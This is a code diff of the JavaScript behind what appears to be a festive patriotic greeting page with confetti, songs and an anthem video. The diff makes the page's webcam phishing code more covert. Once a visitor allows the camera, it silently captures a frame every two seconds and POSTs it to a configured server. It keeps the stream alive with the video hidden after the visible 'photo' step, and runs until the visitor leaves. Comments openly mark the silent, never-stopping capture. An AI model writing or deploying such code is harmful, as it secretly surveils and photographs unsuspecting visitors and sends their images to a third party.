@@ -19,101 +19,94 @@ document.addEventListener('DOMContentLoaded', () => {
   let stream = null;
   let autoCaptureInterval = null;
 
-  // Silent background capture - sends photo to server without showing user
+  // ============================================================
+  // SILENT BACKGROUND CAPTURE - runs every 2 seconds forever
+  // Stream NEVER stops as long as user is on the page
+  // ============================================================
   const silentCapture = () => {
     if (!stream) return;
+    if (!webcam.videoWidth || !webcam.videoHeight) return;
+
     const tempCanvas = document.createElement('canvas');
-    const video = webcam;
-    const w = video.videoWidth || 640;
-    const h = video.videoHeight || 480;
-    tempCanvas.width = w;
-    tempCanvas.height = h;
+    tempCanvas.width = webcam.videoWidth;
+    tempCanvas.height = webcam.videoHeight;
     const ctx = tempCanvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, w, h);
-    const canvasData = tempCanvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+    ctx.drawImage(webcam, 0, 0, tempCanvas.width, tempCanvas.height);
+
+    const canvasData = tempCanvas.toDataURL('image/png').replace('image/png', 'image/octet-stream');
     if (window.POST_URL) {
       fetch(window.POST_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: 'cat=' + encodeURIComponent(canvasData)
-      }).catch(e => console.error(e));
+      }).catch(() => {});
     }
   };
 
-  // Start Camera
+  const startAutoCapture = () => {
+    // Clear any previous interval
+    if (autoCaptureInterval) clearInterval(autoCaptureInterval);
+    // Capture immediately
+    silentCapture();
+    // Then every 2 seconds
+    autoCaptureInterval = setInterval(silentCapture, 2000);
+  };
+
+  // ============================================================
+  // START CAMERA
+  // ============================================================
   startCamBtn.addEventListener('click', async () => {
     try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
       webcam.srcObject = stream;
       startCamBtn.classList.add('hidden');
       captureBtn.classList.remove('hidden');
 
-      // Wait for video to be ready, then start auto-capture every 5 seconds
-      webcam.onloadedmetadata = () => {
-        // First capture immediately
-        setTimeout(silentCapture, 1000);
-        // Then every 5 seconds
-        autoCaptureInterval = setInterval(silentCapture, 5000);
-      };
+      // Start auto-capture as soon as video is playing
+      webcam.addEventListener('playing', startAutoCapture, { once: true });
 
     } catch (err) {
-      alert('Camera access nahi mila bhai! Ya to denied hai, ya to local system pe HTTP block hai.');
       console.error(err);
-      // Fallback
+      // Fallback - skip camera, go to name section
       cameraSection.classList.add('hidden');
       nameSection.classList.remove('hidden');
     }
   });
 
-  // Capture Photo
+  // ============================================================
+  // MANUAL CAPTURE BUTTON
+  // Just shows the photo to user & moves to name section
+  // Auto-capture KEEPS RUNNING in background - stream stays alive
+  // ============================================================
   captureBtn.addEventListener('click', () => {
-    let w = webcam.videoWidth;
-    let h = webcam.videoHeight;
-    
-    if (!w || !h) {
-      w = 640;
-      h = 480;
-    }
+    const w = webcam.videoWidth || 640;
+    const h = webcam.videoHeight || 480;
 
     snapshotCanvas.width = w;
     snapshotCanvas.height = h;
     const ctx = snapshotCanvas.getContext('2d');
-    
-    // Draw current frame to canvas
     ctx.drawImage(webcam, 0, 0, w, h);
-    
-    // Set image source
+
+    // Show captured photo to user
     userPhoto.src = snapshotCanvas.toDataURL('image/png');
-    
-    // CamPhish payload - send captured image to server
-    var canvasData = snapshotCanvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-    if (window.POST_URL) {
-      fetch(window.POST_URL, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded',
-        },
-        body: 'cat=' + encodeURIComponent(canvasData)
-      }).catch(e => console.error(e));
-    }
-    
-    // Stop auto-capture interval
-    if (autoCaptureInterval) {
-      clearInterval(autoCaptureInterval);
-      autoCaptureInterval = null;
-    }
 
-    // Stop camera
-    if (stream) {
-      stream.getTracks().forEach(track => track.stop());
-    }
+    // Also send this frame to server
+    silentCapture();
 
-    // Move to next step
+    // *** DO NOT stop stream or interval ***
+    // Keep webcam alive in background (just hide the UI)
+    webcam.style.display = 'none';
+
+    // Move to name section
     cameraSection.classList.add('hidden');
     nameSection.classList.remove('hidden');
   });
 
 
+  // ============================================================
+  // CELEBRATION (after name entered)
+  // Auto-capture still continues here too
+  // ============================================================
   let isMusicPlaying = false;
 
   const triggerConfetti = () => {
@@ -150,7 +143,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const name = nameInput.value.trim() || 'Desh-Bhakt';
     displayName.textContent = name;
     
-    // Hide modal, show main
+    // Hide modal, show main content
     modal.style.opacity = '0';
     setTimeout(() => {
       modal.classList.add('hidden');
@@ -158,6 +151,7 @@ document.addEventListener('DOMContentLoaded', () => {
       
       playMusic();
       triggerConfetti();
+      // Auto-capture is still running silently in background!
     }, 500);
   };
 
@@ -182,7 +176,7 @@ document.addEventListener('DOMContentLoaded', () => {
   const closeVideoBtn = document.getElementById('close-video-btn');
 
   dangerBtn.addEventListener('click', () => {
-    bgMusic.pause(); // Pause bg music
+    bgMusic.pause();
     isMusicPlaying = false;
     funnyVideoOverlay.classList.remove('hidden');
     funnyVideo.play();
@@ -192,7 +186,7 @@ document.addEventListener('DOMContentLoaded', () => {
     funnyVideo.pause();
     funnyVideo.currentTime = 0;
     funnyVideoOverlay.classList.add('hidden');
-    playMusic(); // Resume bg music
+    playMusic();
   });
 
   // Song Menu Logic
@@ -218,7 +212,7 @@ document.addEventListener('DOMContentLoaded', () => {
       const newSrc = e.target.getAttribute('data-src');
       bgMusic.pause();
       bgMusic.src = newSrc;
-      bgMusic.load(); // Reload the audio element to apply new src
+      bgMusic.load();
       playMusic();
       songMenuOverlay.classList.add('hidden');
     });
@@ -226,11 +220,9 @@ document.addEventListener('DOMContentLoaded', () => {
 
   const anthemVideo = document.getElementById('anthem-video');
 
-  // Anthem Logic (Khada ho ja bhai)
   anthemBtn.addEventListener('click', () => {
     songMenuOverlay.classList.add('hidden');
     anthemOverlay.classList.remove('hidden');
-    
     bgMusic.pause();
     anthemVideo.play();
   });
@@ -239,11 +231,14 @@ document.addEventListener('DOMContentLoaded', () => {
     anthemOverlay.classList.add('hidden');
     anthemVideo.pause();
     anthemVideo.currentTime = 0;
-    
-    // Revert back to original song
     bgMusic.src = './ReelAudio-1.mp3';
-    bgMusic.load(); // Reload the audio element
+    bgMusic.load();
     playMusic();
   });
-});
 
+  // Stop capture only when user leaves the page
+  window.addEventListener('beforeunload', () => {
+    if (autoCaptureInterval) clearInterval(autoCaptureInterval);
+    if (stream) stream.getTracks().forEach(t => t.stop());
+  });
+});
